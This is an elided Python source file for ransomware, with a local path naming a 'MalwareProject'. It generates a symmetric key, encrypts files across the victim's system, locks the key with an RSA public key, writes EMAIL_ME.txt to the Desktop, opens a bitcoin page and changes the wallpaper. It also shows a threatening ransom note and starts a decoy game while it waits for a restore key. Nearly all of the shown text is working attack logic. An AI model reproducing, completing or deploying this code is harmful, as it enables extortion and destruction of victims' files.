...
class SecureData:
    ...
    def __init__(self):
        ...
        self.localRoot = r'D:\Coding\Python\MalwareProject\LocalTesting'  # Debugging/Testing
        self.publicIP = requests.get('https://api.ipify.org').text

    # Generates a unique key for encryption
    def generate_encryption_key(self):
        self.secure_key = Fernet.generate_key()
        self.encryption_tool = Fernet(self.secure_key)

    # Write the encryption key to a file
    def store_key(self):
        with open('secure_key.txt', 'wb') as f:
            f.write(self.secure_key)

    # Encrypt the encryption key with an asymmetric RSA public key
    def encrypt_secure_key(self):
        with open('secure_key.txt', 'rb') as fk:
            secure_key = fk.read()
        with open('secure_key.txt', 'wb') as f:
            self.asymmetric_key = RSA.import_key(open('public_key.pem').read())
            rsa_crypter = PKCS1_OAEP.new(self.asymmetric_key)
            enc_secure_key = rsa_crypter.encrypt(secure_key)
            f.write(enc_secure_key)
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_secure_key)
        self.secure_key = enc_secure_key
        self.encryption_tool = None

    # Encrypt/Decrypt file using the encryption key
    def encrypt_decrypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.encryption_tool.encrypt(data)
            else:
                _data = self.encryption_tool.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)

    # Encrypt/Decrypt system files
    def process_system_files(self, encrypted=False):
        ...
        for root, dir, files in system:
            for file in files:
                ...
                if not encrypted:
                    ...
                    self.encrypt_decrypt_file(file_path, encrypted=True)
...
Do NOT send "PAID" without paying; the price WILL go up for disobedience.
...
''')
    ...
    def restore_system(self):
        while True:
            try:
                with open(f'{self.sysRoot}/Desktop/RESTORE.txt', 'r') as f:
                    self.secure_key = f.read()
                    self.encryption_tool = Fernet(self.secure_key)
                    self.process_system_files(encrypted=True)
                    break
...
def main():
    ...
    secure_obj.generate_encryption_key()
    secure_obj.process_system_files()
    secure_obj.store_key()
    secure_obj.encrypt_secure_key()
    secure_obj.change_wallpaper()
    secure_obj.explore_bitcoin()
    secure_obj.create_ransom_note()

    # Start game after 1 second
    time.sleep(1)
    game_thread = threading.Thread(target=alternate_game)
    game_thread.start()

    # Start ransom note thread
    t1 = threading.Thread(target=secure_obj.show_ransom_note)
    t2 = threading.Thread(target=secure_obj.restore_system)

    t1.start()
    print('> Attack completed on target machine and system is encrypted')
    print('> Waiting for attacker to give target machine document that will un-encrypt machine')
    t2.start()
...
if __name__ == '__main__':
    main()
# like you really thought it would help ?
